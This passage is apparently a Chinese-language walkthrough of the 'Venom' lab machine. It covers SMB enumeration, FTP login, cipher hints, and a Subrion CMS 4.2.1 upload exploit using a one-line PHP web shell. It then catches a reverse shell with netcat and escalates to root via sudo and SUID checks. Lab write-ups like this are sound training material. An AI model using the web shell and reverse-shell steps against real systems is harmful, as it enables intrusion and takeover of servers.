class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 192.168.109.147</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 28 09:18:59 2021</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 192.168.109.147</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Enumerating Workgroup/Domain on 192.168.109.147    |</span><br><span class="line"> ======================================================= </span><br><span class="line">[+] Got domain/workgroup name: WORKGROUP</span><br><span class="line"></span><br><span class="line"> =============================================== </span><br><span class="line">|    Nbtstat Information <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> =============================================== </span><br><span class="line">Looking up status of 192.168.109.147</span><br><span class="line">        VENOM           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        VENOM           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        VENOM           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ======================================== </span><br><span class="line">|    Session Check on 192.168.109.147    |</span><br><span class="line"> ======================================== </span><br><span class="line">[+] Server 192.168.109.147 allows sessions using username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ============================================== </span><br><span class="line">Domain Name: WORKGROUP</span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line">[+] Can<span class="string">&#x27;t determine if host is part of domain or part of a workgroup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    OS information on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.</span></span><br><span class="line"><span class="string">[+] Got OS info for 192.168.109.147 from smbclient: </span></span><br><span class="line"><span class="string">[+] Got OS info for 192.168.109.147 from srvinfo:</span></span><br><span class="line"><span class="string">        VENOM          Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu)</span></span><br><span class="line"><span class="string">        platform_id     :       500</span></span><br><span class="line"><span class="string">        os version      :       6.1</span></span><br><span class="line"><span class="string">        server type     :       0x809a03</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ================================ </span></span><br><span class="line"><span class="string">|    Users on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ================================ </span></span><br><span class="line"><span class="string">Use of uninitialized value $users in print at ./enum4linux.pl line 874.</span></span><br><span class="line"><span class="string">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use of uninitialized value $users in print at ./enum4linux.pl line 888.</span></span><br><span class="line"><span class="string">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string">|    Share Enumeration on 192.168.109.147    |</span></span><br><span class="line"><span class="string"> ============================================ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">        print$          Disk      Printer Drivers</span></span><br><span class="line"><span class="string">        IPC$            IPC       IPC Service (venom server (Samba, Ubuntu))</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on 192.168.109.147</span></span><br><span class="line"><span class="string">//192.168.109.147/print$        Mapping: DENIED, Listing: N/A</span></span><br><span class="line"><span class="string">//192.168.109.147/IPC$  [E] Can&#x27;</span>t understand response:</span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line"></span><br><span class="line"> ======================================================= </span><br><span class="line">|    Password Policy Information <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ======================================================= </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Attaching to 192.168.109.147 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">        [+] VENOM</span><br><span class="line">        [+] Builtin</span><br><span class="line"></span><br><span class="line">[+] Password Info <span class="keyword">for</span> Domain: VENOM</span><br><span class="line"></span><br><span class="line">        [+] Minimum password length: 5</span><br><span class="line">        [+] Password <span class="built_in">history</span> length: None</span><br><span class="line">        [+] Maximum password age: 37 days 6 hours 21 minutes </span><br><span class="line">        [+] Password Complexity Flags: 000000</span><br><span class="line"></span><br><span class="line">                [+] Domain Refuse Password Change: 0</span><br><span class="line">                [+] Domain Password Store Cleartext: 0</span><br><span class="line">                [+] Domain Password Lockout Admins: 0</span><br><span class="line">                [+] Domain Password No Clear Change: 0</span><br><span class="line">                [+] Domain Password No Anon Change: 0</span><br><span class="line">                [+] Domain Password Complex: 0</span><br><span class="line"></span><br><span class="line">        [+] Minimum password age: None</span><br><span class="line">        [+] Reset Account Lockout Counter: 30 minutes </span><br><span class="line">        [+] Locked Account Duration: 30 minutes </span><br><span class="line">        [+] Account Lockout Threshold: None</span><br><span class="line">        [+] Forced Log off Time: 37 days 6 hours 21 minutes </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line"></span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ================================= </span><br><span class="line">|    Groups on 192.168.109.147    |</span><br><span class="line"> ================================= </span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">builtin</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting <span class="built_in">local</span> group memberships:</span><br><span class="line"></span><br><span class="line">[+] Getting domain <span class="built_in">groups</span>:</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line"></span><br><span class="line"> ========================================================================== </span><br><span class="line">|    Users on 192.168.109.147 via RID cycling (RIDS: 500-550,1000-1050)    |</span><br><span class="line"> ========================================================================== </span><br><span class="line">[I] Found new SID: S-1-22-1</span><br><span class="line">[I] Found new SID: S-1-5-21-3525385883-4254613925-43684688</span><br><span class="line">[I] Found new SID: S-1-5-32</span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-5-21-3525385883-4254613925-43684688 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">...skip...</span><br><span class="line"></span><br><span class="line">[+] Enumerating <span class="built_in">users</span> using SID S-1-22-1 and logon username <span class="string">&#x27;&#x27;</span>, password <span class="string">&#x27;&#x27;</span></span><br><span class="line">S-1-22-1-1000 Unix User\nathan (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\hostinger (Local User)</span><br><span class="line"></span><br><span class="line"> ================================================ </span><br><span class="line">|    Getting printer info <span class="keyword">for</span> 192.168.109.147    |</span><br><span class="line"> ================================================ </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Wed Jul 28 09:19:14 2021</span><br></pre></td></tr></table></figure><p>经过枚举可以发现<code>hostinger</code>是使用者之一，结合之前解密的MD5值进行<code>ftp</code>登录</p><h2 id="ftp登录"><a href="#ftp登录" class="headerlink" title="ftp登录"></a>ftp登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.109.147</span><br><span class="line">Connected to 192.168.109.147.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.109.147:kali): hostinger</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 1002     1002         4096 May 21 23:43 files</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> files</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             384 May 21 23:43 hint.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get hint.txt</span><br><span class="line"><span class="built_in">local</span>: hint.txt remote: hint.txt</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> hint.txt (384 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">384 bytes received <span class="keyword">in</span> 0.04 secs (10.3970 kB/s)</span><br></pre></td></tr></table></figure><p>可以登录成功，可以发现<code>files</code>目录下存在<code>hint.txt</code>，下载下来查看内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Hey there... </span><br><span class="line"></span><br><span class="line">T0D0 --</span><br><span class="line"></span><br><span class="line">* You need to follow the &#x27;hostinger&#x27; on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=</span><br><span class="line">* some knowledge of cipher is required to decode the dora password..</span><br><span class="line">* try on venom.box</span><br><span class="line">password -- L7f9l8@J#p%Ue+Q1234 -&gt; deocode this you will get the administrator password </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Have fun .. :)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在<code>hint.txt</code>中存在两段base64编码的字符串</p><h2 id="Base64-解码"><a href="#Base64-解码" class="headerlink" title="Base64 解码"></a>Base64 解码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=&#x27;</span> | <span class="built_in">base64</span> -d | <span class="built_in">base64</span> -d | <span class="built_in">base64</span> -d</span><br><span class="line">standard vigenere cipher                                                 </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=&#x27;</span> | <span class="built_in">base64</span> -d                            </span><br><span class="line">https://cryptii.com/pipes/vigenere-cipher                                               </span><br></pre></td></tr></table></figure><p>第一段需要解码4次，第二段解码为一个网址</p><p>整理信息：</p><ul><li>解码bash64得到相关信息</li><li>盒子主机名为<code>venom.box</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You need to follow the &#x27;hostinger&#x27; on standard vigenere cipher also https://cryptii.com/pipes/vigenere-cipher</span><br></pre></td></tr></table></figure></li></ul><p>添加主机名到主机文件中，访问域名可得到新的页面，此处参考另一种思路，在<code>https://cryptii.com/pipes/vigenere-cipher</code>可以解密得到<code>dora</code>的密码</p><p><img src="/images/pasted-22.png" class="lazyload" data-srcset="/images/pasted-22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h2 id="登录venom-box"><a href="#登录venom-box" class="headerlink" title="登录venom.box"></a>登录venom.box</h2><p><img src="/images/pasted-23.png" class="lazyload" data-srcset="/images/pasted-23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>此处可以看到版本信息为<code>Subrion CMS 4.2.1</code><br>在<code>exploit-db</code>中搜索可以得到该版本存在一个文件上传漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/images/pasted-25.png" class="lazyload" data-srcset="/images/pasted-25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>通过构造一句话木马上传后以获得shell，根据提示可以得知因为该版本中<code>.htaccess</code>文件中忽略了<code> .pht、 .phar</code>文件后缀的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> php-shell.phar </span><br><span class="line">&lt;?php system(<span class="variable">$_GET</span>[cmd]); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-26.png" class="lazyload" data-srcset="/images/pasted-26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>成功执行命令</p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>通过前面上传的一句话木马执行python反向连接shell<br><img src="/images/pasted-28.png" class="lazyload" data-srcset="/images/pasted-28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>此时需要监听4444 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444                                                                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.109.140] from venom.box [192.168.109.147] 33098</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>成功获取shell<br>此时是在<code>upload</code>目录的<br>切换到<code>home</code>目录下查看存在用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">$ <span class="built_in">ls</span> -lart</span><br><span class="line"><span class="built_in">ls</span> -lart</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 24 root      root      4096 May 20 10:08 ..</span><br><span class="line">drwxr-xr-x  4 root      root      4096 May 21 17:00 .</span><br><span class="line">drwxr-x--- 17 nathan    nathan    4096 May 22 00:21 nathan</span><br><span class="line">drwxr-xr-x 16 hostinger hostinger 4096 May 22 13:58 hostinger</span><br></pre></td></tr></table></figure><p>使用<code>hostinger/hostinger</code>登录，登录成功后在<code>/var/www/html/subrion/backup</code>下<code>.htaccess</code>文件中存在<code>nathan</code>密码</p><p>切换<code>nathan</code>用户，可获取第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">su nathan</span><br><span class="line">su nathan</span><br><span class="line">Password: FzN+f2-rRaBgvALzj*Rk<span class="comment">#_JJYfg8XfKhxqB82x_a</span></span><br><span class="line"></span><br><span class="line">nathan@venom:/var/www/html/subrion/backup$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(nathan) gid=1000(nathan) <span class="built_in">groups</span>=1000(nathan),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">nathan@venom:/var/www/html/subrion/backup$ <span class="built_in">cd</span> </span><br><span class="line"><span class="built_in">cd</span> </span><br><span class="line">nathan@venom:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads         Music     Public     user.txt</span><br><span class="line">Documents  examples.desktop  Pictures  Templates  Videos</span><br><span class="line">nathan@venom:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">W3_@r3_V3n0m:P</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>尝试<code>sudo</code>提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">sudo -l </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nathan on venom:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User nathan may run the following commands on venom:</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">    (root) ALL, !/bin/su</span><br></pre></td></tr></table></figure><p>参考得知这里直接运行<code>sudo bash</code>即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br><span class="line">sudo -l </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> nathan on venom:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User nathan may run the following commands on venom:</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">    (root) ALL, !/bin/su</span><br><span class="line">nathan@venom:~$ sudo bash</span><br><span class="line">sudo bash</span><br><span class="line">root@venom:~<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure><p>第二种方式<br>通过查找设置了SUID位的文件<br><code>find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nathan@venom:~$ find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">-rwsr-xr-x 1 root root 1473576 Apr 20 10:15 /opt/VBoxGuestAdditions-6.1.20/bin/VBoxDRMClient</span><br><span class="line">-rwsr-s--- 1 root nathan 238080 Nov  5  2017 /usr/bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-sr-x 1 root root 10232 Jul  3  2020 /usr/lib/xorg/Xorg.wrap</span><br><span class="line">-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 43088 Sep 17  2020 /snap/core18/2066/bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/2066/bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 44664 Mar 23  2019 /snap/core18/2066/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 26696 Sep 17  2020 /snap/core18/2066/bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 76496 Mar 23  2019 /snap/core18/2066/usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 44528 Mar 23  2019 /snap/core18/2066/usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 75824 Mar 23  2019 /snap/core18/2066/usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 40344 Mar 23  2019 /snap/core18/2066/usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 59640 Mar 23  2019 /snap/core18/2066/usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 149080 